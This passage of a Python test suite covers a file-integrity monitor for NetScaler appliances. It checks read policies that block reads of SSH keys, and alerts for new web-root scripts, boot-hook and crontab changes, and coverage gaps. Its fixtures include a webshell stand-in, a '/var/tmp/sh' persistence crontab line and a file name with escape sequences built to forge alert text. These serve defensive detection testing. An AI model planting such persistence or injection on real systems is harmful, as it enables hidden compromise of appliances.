    _read("ID_RSA", "/var/vpn"), _read("id_ed25519_sk", "/var/pubkey/u"),
    _read("x.PEM", "/var/tmp"), _read("backup.tar", "/var/pubkey/u"),
])
def test_fim_read_policy_refuses_keys_config_and_cores(command: str) -> None:
    assert not re.search(appliance.FIM_READ_REGEX, command)


def test_fim_snippet_is_marked_verify_and_fits_a_cmdspec() -> None:
    snippet = appliance.fim_snippet()
    assert "VERIFY" in snippet and "nr_fim" in snippet
    for regex in (appliance.FIM_LIST_REGEX, appliance.FIM_READ_REGEX,
                  appliance.FIM_VERSION_REGEX):
        assert f'"{regex}"' in snippet
        assert '"' not in regex and len(regex) < 1023  # VERIFY the cmdSpec limit per build
    assert re.search(appliance.FIM_VERSION_REGEX, "show ns version")


def test_tier_a_paths_are_all_in_the_policy() -> None:
    for watch in TIER_A:
        assert re.search(appliance.FIM_LIST_REGEX, _listing(watch.root))


def test_device_snippet_prints_the_fim_account_only_when_enabled() -> None:
    cfg = load_config(Path(__file__).parents[2] / "deploy" / "config.example.yaml")
    device = cfg.devices[0]
    assert "add system user nr_fim" not in appliance.device_snippet(cfg, device, "192.0.2.5")
    enabled = device.model_copy(update={"fim": DeviceFim(enabled=True)})
    snippet = appliance.device_snippet(cfg, enabled, "192.0.2.5")
    assert "bind system user nr_fim netrescale_fim_list 100" in snippet
    assert "add system cmdPolicy netrescale_ro ALLOW" in snippet


async def test_attacker_chosen_file_names_cannot_forge_summary_lines(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    name = "x\x1b[2J\nSeverity:  info.php"
    fake.files[f"/var/vpn/{name}"] = b"<?php"
    shell = rules(await tick(monitor, fake, T0 + WALK))["fim-webroot-new-script"]
    assert "\n" not in shell.summary and "\x1b" not in shell.summary
    assert "\\nSeverity:" in shell.summary
    assert shell.evidence["files"][0]["path"] == f"/var/vpn/{name}"  # raw name kept
    assert f"/var/vpn/{name}" not in content_reads(fake)  # ":" cannot be sent through NITRO


async def test_tier_a_file_never_hashed_before_is_reported_when_it_moves(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.denied_reads = {"/nsconfig"}  # e.g. the read policy was added later
    await tick(monitor, fake, T0)
    fake.denied_reads = set()
    fake.files["/nsconfig/rc.netscaler"] = b"#!/bin/sh\n/var/tmp/xxxxxxxxx\n"  # same size
    fake.file_times["/nsconfig/rc.netscaler"] = "Tue Oct 13 12:00:30 2026"
    found = rules(await tick(monitor, fake, T0 + PROBE))
    change = found["fim-boot-hook-changed"]
    assert change.evidence["files"][0]["verified"] is False
    assert "fim-coverage-restored" not in found  # /nsconfig/ssh is re-read at the re-hash
    assert "fim-coverage-restored" in rules(await tick(monitor, fake, T0 + REHASH))


def test_fim_snippet_comment_shows_the_escape_literally() -> None:
    assert "that \\x22 in a cmdSpec matches a double quote" in appliance.fim_snippet()


# ---- regressions from the adversarial review ------------------------------------------------

async def test_a_listed_file_whose_read_says_missing_is_still_reported(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/var/vpn/shell.php"] = b"<?php"
    fake.missing_reads = {"/var/vpn/shell.php"}
    found = rules(await tick(monitor, fake, T0 + WALK))
    shell = found["fim-webroot-new-script"]
    assert shell.severity is Severity.CRITICAL
    assert shell.evidence["files"][0]["verified"] is False
    assert ["/var/vpn", "content could not be read"] in (
        found["fim-coverage-unknown"].evidence["gaps"])


async def test_a_listed_subdirectory_that_cannot_be_listed_is_a_gap(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.missing_listings = {"/var/vpn/themes"}
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert ["/var/vpn/themes", "listing failed"] in found["fim-coverage-unknown"].evidence["gaps"]
    assert "fim-webroot-file-removed" not in found  # unseen is not gone
    assert "/var/vpn/themes/theme.js" in monitor._load()["files"]


async def test_one_hanging_read_cannot_hide_tier_a_or_stop_the_pass(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/var/vpn/pipe.js"] = b""  # e.g. a FIFO that never answers a read
    fake.transport_errors = {"/var/vpn/pipe.js"}
    fake.files["/nsconfig/nsafter.sh"] = b"persist"
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert found["fim-boot-hook-changed"].severity is Severity.CRITICAL
    assert found["fim-webroot-new-script"].evidence["files"][0]["verified"] is False
    assert ["/var/vpn", "content could not be read"] in (
        found["fim-coverage-unknown"].evidence["gaps"])
    assert monitor._load()["tier_b_at"] == (T0 + WALK).isoformat()


async def test_a_failed_web_root_pass_is_a_gap_and_tier_a_still_reports(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.transport_errors = {"/var/tmp"}  # the walk itself times out
    fake.files["/var/cron/tabs/nobody"] = b"* * * * * /var/tmp/sh"
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert found["fim-crontab-changed"].severity is Severity.CRITICAL
    assert ["web roots, temp and crash directories", "pass failed (ReadTimeout)"] in (
        found["fim-coverage-unknown"].evidence["gaps"])
    fake.transport_errors = set()
    assert "fim-coverage-restored" in rules(await tick(monitor, fake, T0 + 2 * WALK))


async def test_tier_a_findings_are_staged_before_the_web_root_pass(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/nsconfig/nsafter.sh"] = b"persist"

    async def cancelled(*_args: object, **_kwargs: object) -> None:
        raise asyncio.CancelledError  # e.g. the daemon's outer timeout firing mid-walk

    async with client(fake) as c:
        c.walk_files = cancelled  # type: ignore[method-assign]
        with pytest.raises(asyncio.CancelledError):
            await monitor.tick(c, T0 + WALK)
    found = rules(await tick(monitor, fake, T0 + WALK + PROBE))
    assert found["fim-boot-hook-changed"].severity is Severity.CRITICAL


async def test_rebaseline_ends_after_the_first_post_upgrade_pass(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.denied_paths = {"/var/vpn/themes"}  # a permanently incomplete web root
    await tick(monitor, fake, T0)
    fake.version = "NetScaler NS14.1: Build 74.10.nc, Date: Nov  1 2026, 10:00:00   (64-bit)"
    fake.files["/etc/crontab"] = b"*/5 * * * * root /usr/libexec/atrun\n0 3 * * * root x\n"
    found = rules(await tick(monitor, fake, T0 + WALK))
    cron = found["fim-crontab-changed"]
    assert cron.severity is Severity.CRITICAL  # crontabs are never folded into a re-baseline
    assert cron.evidence["firmware_change"]["to"].startswith("NetScaler NS14.1: Build 74.10")
    assert monitor.status["rebaseline_pending"] is False
    fake.files["/var/vpn/shell.php"] = b"<?php"
    later = rules(await tick(monitor, fake, T0 + 2 * WALK))
    assert later["fim-webroot-new-script"].severity is Severity.CRITICAL


async def test_a_directory_first_listed_later_is_baselined_not_alerted(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.files.update({f"/var/netscaler/logon/LogonPoint/receiver/js/m{i}.js": b"x"
                       for i in range(30)})
    fake.denied_paths = {"/var/netscaler/logon/LogonPoint/receiver"}
    await tick(monitor, fake, T0)
    fake.denied_paths = set()  # the admin fixed the policy, as the coverage finding asked
    fake.files["/var/vpn/themes/evil/x.php"] = b"<?php"  # while a really new directory appears
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert found["fim-baseline-recorded"].evidence["files_per_directory"] == {
        "/var/netscaler/logon": 31}
    new = found["fim-webroot-new-script"]
    assert [f["path"] for f in new.evidence["files"]] == ["/var/vpn/themes/evil/x.php"]


async def test_time_limited_walks_do_not_re_alert_coverage_every_pass(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path, walk_seconds=10)
    fake.files.update({f"/var/tmp/d{i}/f.log": b"x" for i in range(40)})
    ticks = iter(range(0, 10**6, 1))
    monitor.clock = lambda: float(next(ticks))
    coverage = []
    for n in range(4):
        coverage += [f for f in await tick(monitor, fake, T0 + n * WALK)
                     if f.rule_id.startswith("fim-coverage")]
    assert [f.rule_id for f in coverage] == ["fim-coverage-unknown"]
    assert ["web roots, temp and crash directories",
            "not fully listed (walk_seconds time limit reached)"] in coverage[0].evidence["gaps"]


async def test_time_limit_gap_needs_several_passes_in_time_to_clear(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path, walk_seconds=10)
    fake.files.update({f"/netscaler/ns_gui/vpn/d{i}/a.html": b"x" for i in range(10)})
    coverage = []
    for n, step in enumerate([0.0, 0.3, 0.5, 0.0, 0.4, 0.0, 0.0, 0.0, 0.0]):
        elapsed = {"t": 0.0}

        def clock(step: float = step, elapsed: dict[str, float] = elapsed) -> float:
            elapsed["t"] += step  # appliance latency that varies from pass to pass
            return elapsed["t"]

        monitor.clock = clock
        coverage += [f.rule_id for f in await tick(monitor, fake, T0 + n * WALK)
                     if f.rule_id.startswith("fim-coverage")]
    assert coverage == ["fim-coverage-unknown", "fim-coverage-restored"]
